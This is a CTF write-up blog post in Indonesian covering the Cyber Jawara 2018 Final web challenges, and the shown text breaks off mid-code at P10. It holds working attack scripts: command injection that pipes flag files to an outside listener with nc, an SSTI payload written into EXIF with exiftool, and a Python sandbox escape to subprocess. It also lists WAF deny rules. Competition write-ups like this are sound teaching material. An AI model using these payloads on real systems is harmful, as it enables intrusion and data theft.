<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="P03 - Image ManipulatorPada source Driver/Convert.php terdapat fungsi berikut 123456789101112131415161718192021222324public function executeConvertCmd($cmd, $values = array())&amp;#123;    // First, get a">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="Cyber Jawara 2018 Final - Web Exploitation">
<meta property="og:url" content="http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/index.html">
<meta property="og:site_name" content="&#x2F;home&#x2F;rhama&#x2F;">
<meta property="og:description" content="P03 - Image ManipulatorPada source Driver/Convert.php terdapat fungsi berikut 123456789101112131415161718192021222324public function executeConvertCmd($cmd, $values = array())&amp;#123;    // First, get a">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2018-10-17T12:30:53.739Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Cyber Jawara 2018 Final - Web Exploitation">
<meta name="twitter:description" content="P03 - Image ManipulatorPada source Driver/Convert.php terdapat fungsi berikut 123456789101112131415161718192021222324public function executeConvertCmd($cmd, $values = array())&amp;#123;    // First, get a">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Cyber Jawara 2018 Final - Web Exploitation</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/rhamaa">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&text=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&is_video=false&description=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cyber Jawara 2018 Final - Web Exploitation&body=Check out this article: http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&name=Cyber Jawara 2018 Final - Web Exploitation&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#P03-Image-Manipulator"><span class="toc-number">1.</span> <span class="toc-text">P03 - Image Manipulator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P04-Code-Runner"><span class="toc-number">2.</span> <span class="toc-text">P04 - Code Runner</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P07-Exif-Reader"><span class="toc-number">3.</span> <span class="toc-text">P07 - Exif Reader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P08-Hackme"><span class="toc-number">4.</span> <span class="toc-text">P08 - Hackme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P10-Assignment-Solved-After-Competition"><span class="toc-number">5.</span> <span class="toc-text">P10 - Assignment (Solved After Competition)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Note"><span class="toc-number">6.</span> <span class="toc-text">Note</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Cyber Jawara 2018 Final - Web Exploitation
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">rhama</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-10-17T03:25:07.000Z" itemprop="datePublished">2018-10-17</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="P03-Image-Manipulator"><a href="#P03-Image-Manipulator" class="headerlink" title="P03 - Image Manipulator"></a>P03 - Image Manipulator</h2><p>Pada source <code>Driver/Convert.php</code> terdapat fungsi berikut</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">executeConvertCmd</span><span class="params">($cmd, $values = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// First, get a temporary file for the input</span></span><br><span class="line">    <span class="keyword">if</span> (strpos($cmd, <span class="string">'__FILEIN__'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $tmpin = <span class="keyword">$this</span>-&gt;toFile(<span class="keyword">$this</span>-&gt;_data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $tmpin = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Now an output file</span></span><br><span class="line">    $tmpout = stream_get_meta_data(tmpfile())[<span class="string">'uri'</span>];</span><br><span class="line">    <span class="comment">// Substitue them in the cmd string</span></span><br><span class="line">    $cmd = str_replace(</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'__FILEIN__'</span>, <span class="string">'__FILEOUT__'</span>, <span class="string">'__CONVERT__'</span>),</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'"'</span> . $tmpin . <span class="string">'"'</span>, <span class="string">'"'</span> . $tmpout . <span class="string">'"'</span>, <span class="keyword">$this</span>-&gt;_convert),</span><br><span class="line">        $cmd</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> See what else needs to be replaced.</span></span><br><span class="line">    $cmd = <span class="keyword">$this</span>-&gt;_convert . <span class="string">' '</span> . $cmd . <span class="string">' 2&gt;&amp;1'</span>;</span><br><span class="line"></span><br><span class="line">    exec($cmd, $output, $retval);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_data = file_get_contents($tmpout);</span><br><span class="line">    @unlink($tmpin);</span><br><span class="line">    @unlink($tmpout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Dibagian kontruktor terdapat setup <code>$cmd</code> yang dimana <code>$cmd</code> berasal dari hasil requests.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($params, $context = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">parent</span>::__construct($params, $context);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($context[<span class="string">'convert'</span>])) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(</span><br><span class="line">            <span class="string">'A path to the convert binary is required.'</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_convert = $context[<span class="string">'convert'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($context[<span class="string">'identify'</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_identify = $context[<span class="string">'identify'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($params[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadFile($params[<span class="string">'filename'</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($params[<span class="string">'data'</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadString($params[<span class="string">'data'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $cmd = <span class="string">"-size &#123;$this-&gt;_width&#125;x&#123;$this-&gt;_height&#125; xc:&#123;$this-&gt;_background&#125; -strip &#123;$this-&gt;_type&#125;:__FILEOUT__"</span>; <span class="comment">// Here</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;executeConvertCmd($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Dari sini dapat disimpulkan bahwa web ini memiliki celah <code>RCE</code><br>Untuk mengexploit nya cukup dengan mengirimkan <code>123 $(cat /var/flag/* | nc 10.10.30.9 {}) #</code> pada bagian Size misal nya.</p>
<p>Script yang kami gunakan saat melakukan Attack<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retrive_flag</span><span class="params">(port=<span class="number">8888</span>)</span>:</span></span><br><span class="line">    TCP_IP = <span class="string">'0.0.0.0'</span></span><br><span class="line">    TCP_PORT = port</span><br><span class="line">    BUFFER_SIZE = <span class="number">20</span>  <span class="comment"># Normally 1024, but we want fast response</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">2</span>)</span><br><span class="line">        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        s.bind((TCP_IP, TCP_PORT))</span><br><span class="line">        s.listen(<span class="number">1</span>)</span><br><span class="line">        conn, addr = s.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            data += conn.recv(BUFFER_SIZE)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> <span class="string">'&#125;'</span> <span class="keyword">in</span> data: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"CJ2018"</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        print(data)</span><br><span class="line">        conn.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">sp = <span class="number">15000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">19</span>, <span class="number">1</span>):</span><br><span class="line">    t = threading.Thread(name=<span class="string">'my_service'</span>, target=retrive_flag, args=(sp+i,))</span><br><span class="line">    t.start()</span><br><span class="line">    port = str(i).rjust(<span class="number">2</span>, <span class="string">"0"</span>)</span><br><span class="line">    url = <span class="string">"http://172.29.100.8:5&#123;&#125;03/"</span>.format(port)</span><br><span class="line">    files = &#123;<span class="string">'file'</span>: open(<span class="string">'cat_flag.jpg'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">    data = dict(resize=<span class="string">"1"</span>, width=<span class="string">"123 $(cat /var/flag/* | nc 10.10.30.9 &#123;&#125;) #"</span>.format(sp+i))</span><br><span class="line">    r = requests.post(url, files=files, data=data)</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure></p>
<h2 id="P04-Code-Runner"><a href="#P04-Code-Runner" class="headerlink" title="P04 - Code Runner"></a>P04 - Code Runner</h2><p>Pada soal ini cukup mudah, dimana user bisa menjalankan code php dengan beberapa aturan WAF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SecRule REQUEST_URI|ARGS|REQUEST_BODY &quot;exec&quot; &quot;id:1,phase:2,deny&quot;</span><br><span class="line">SecRule REQUEST_URI|ARGS|REQUEST_BODY &quot;passthru&quot; &quot;id:2,phase:2,deny&quot;</span><br><span class="line">SecRule REQUEST_URI|ARGS|REQUEST_BODY &quot;system&quot; &quot;id:3,phase:2,deny&quot;</span><br><span class="line">SecRule REQUEST_URI|ARGS|REQUEST_BODY &quot;shell_exec&quot; &quot;id:4,phase:2,deny&quot;</span><br><span class="line">SecRule REQUEST_URI|ARGS|REQUEST_BODY &quot;popen&quot; &quot;id:5,phase:2,deny&quot;</span><br></pre></td></tr></table></figure>
<p>Untuk membaca file flag bisa menggunakan fungsi <code>glob()</code> untuk melihat nama file flag dan fungsi <code>file_get_conents()</code> untuk membaca flag.</p>
<p>Script yang kami gunakan saat melakukan Attack<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">19</span>,<span class="number">1</span>):</span><br><span class="line">	port = str(i).rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line">	url = <span class="string">"http://172.29.100.8:5&#123;&#125;04/"</span>.format(port)</span><br><span class="line">	data = dict(code=<span class="string">'var_dump(glob("/var/flag/*"));'</span>);</span><br><span class="line">	r = requests.post(url,data=data)</span><br><span class="line">	raw =  r.content</span><br><span class="line">	flagpath = re.findall(<span class="string">'"/var/flag/(.*?)"'</span>,raw)[<span class="number">0</span>]</span><br><span class="line">	data = dict(code=<span class="string">'echo file_get_contents("/var/flag/&#123;&#125;");'</span>.format(flagpath));</span><br><span class="line">	r = requests.post(url,data=data)</span><br><span class="line">	flag = re.findall(<span class="string">'&lt;b&gt;Result:&lt;/b&gt;&lt;br /&gt;CJ2018&#123;(.*?)&#125;'</span>,r.content)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"CJ2018&#123;%s&#125;"</span> % flag</span><br></pre></td></tr></table></figure></p>
<h2 id="P07-Exif-Reader"><a href="#P07-Exif-Reader" class="headerlink" title="P07 - Exif Reader"></a>P07 - Exif Reader</h2><p>Web ini akan membaca metadata dari gambar yang di upload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (hasattr(img, <span class="string">'_getexif'</span>) <span class="keyword">and</span> img._getexif()):</span><br><span class="line">    exif = &#123;</span><br><span class="line">        ExifTags.TAGS[k]: v</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> img._getexif().items()</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> ExifTags.TAGS</span><br><span class="line">    &#125;</span><br><span class="line">    metadata = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> exif.iteritems():</span><br><span class="line">        metadata += <span class="string">"&lt;b&gt;"</span> + str(key) + <span class="string">"&lt;/b&gt; : "</span> + str(value) + <span class="string">"&lt;br&gt;"</span></span><br><span class="line">    metadata += <span class="string">"&lt;br&gt;&lt;br&gt;"</span></span><br></pre></td></tr></table></figure></p>
<p>Lalu web akan merender template dengan metadata yang didapatkan.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">page = open(<span class="string">'template/show.html'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">page = page.replace(<span class="string">'METADATA_PLACEHOLDER'</span>, metadata)</span><br><span class="line">t = tornado.template.Template(page)</span><br><span class="line">self.write(t.generate(image_url=img_path))</span><br></pre></td></tr></table></figure></p>
<p>Dari ini didapatkan bahwa web ini memiliki celah <code>SSTI</code> karena metadata dapat kita ubah.</p>
<p>Untuk mengubah metadata dapat menggunakan <code>exiftool</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -software=<span class="string">'&#123;% import os %&#125;&#123;&#123;os.popen("cat /var/flag/*").read()&#125;&#125;'</span> cat_flag.jpg</span><br></pre></td></tr></table></figure></p>
<p>Script yang kami gunakan saat melakukan Attack<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">19</span>, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = str(i).rjust(<span class="number">2</span>, <span class="string">"0"</span>)</span><br><span class="line">        url = <span class="string">"http://172.29.100.7:5&#123;&#125;07/upload"</span>.format(port)</span><br><span class="line">        files = &#123;<span class="string">'file'</span>: open(<span class="string">'cat_flag.jpg'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">        r = requests.post(url, files=files)</span><br><span class="line">        d = re.findall(<span class="string">"CJ2018&#123;.*&#125;"</span>, r.text)</span><br><span class="line">        print(d[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
<h2 id="P08-Hackme"><a href="#P08-Hackme" class="headerlink" title="P08 - Hackme"></a>P08 - Hackme</h2><p>Di web ini terdapat 2 fungsi, yaitu melakukan <code>nslookup</code> dan <code>evaluate</code>.</p>
<p>Dengan rules WAF<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SecRule ARGS|REQUEST_BODY &quot;\;&quot; &quot;id:1,phase:2,deny&quot;</span><br><span class="line">SecRule ARGS|REQUEST_BODY &quot;\|&quot; &quot;id:2,phase:2,deny&quot;</span><br><span class="line">SecRule ARGS|REQUEST_BODY &quot;\&amp;&quot; &quot;id:3,phase:2,deny&quot;</span><br><span class="line">SecRule ARGS|REQUEST_BODY &quot;os&quot; &quot;id:4,phase:2,deny&quot;</span><br><span class="line">SecRule ARGS|REQUEST_BODY &quot;import&quot; &quot;id:5,phase:2,deny&quot;</span><br></pre></td></tr></table></figure></p>
<p>Kami memanfaatkan fungsi <code>evaluate</code> untuk mendapatkan RCE.</p>
<p>Payload yang kami gunakan<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">105</span>)+chr(<span class="number">109</span>)+chr(<span class="number">112</span>)+chr(<span class="number">111</span>)+chr(<span class="number">114</span>)+chr(<span class="number">116</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)](<span class="string">'subprocess'</span>).check_output(<span class="string">'COMMAND'</span>,shell=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
<p>Script yang kami gunakan saat melakukan Attack<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]('subprocess').check_output('ls /var/flag',shell=True)"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">19</span>,<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = str(i).rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line">        r = requests.post(<span class="string">"http://172.29.100.8:5&#123;&#125;08/evaluate"</span>.format(port),data=&#123;<span class="string">"expression"</span> : payload1&#125;)</span><br><span class="line">        raw = r.content</span><br><span class="line">        path_flag = re.findall(<span class="string">"&lt;body&gt;Result: (.*?)\n&lt;br&gt;"</span>,raw)[<span class="number">0</span>]</span><br><span class="line">        payload2 = <span class="string">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]('subprocess').check_output('cat /var/flag/&#123;&#125;',shell=True)"</span>.format(path_flag)</span><br><span class="line">        r = requests.post(<span class="string">"http://172.29.100.8:5&#123;&#125;08/evaluate"</span>.format(port),data=&#123;<span class="string">"expression"</span> : payload2&#125;)</span><br><span class="line">        raw = r.content</span><br><span class="line">        flag = re.findall(<span class="string">"&lt;body&gt;Result: CJ2018&#123;(.*?)&#125;"</span>,raw)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CJ2018&#123;%s&#125;"</span> %  flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
<h2 id="P10-Assignment-Solved-After-Competition"><a href="#P10-Assignment-Solved-After-Competition" class="headerlink" title="P10 - Assignment (Solved After Competition)"></a>P10 - Assignment (Solved After Competition)</h2><p>Web ini menggunakan freamwork laravel yang sudah di modif.</p>
<p>Source Maincontroller.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 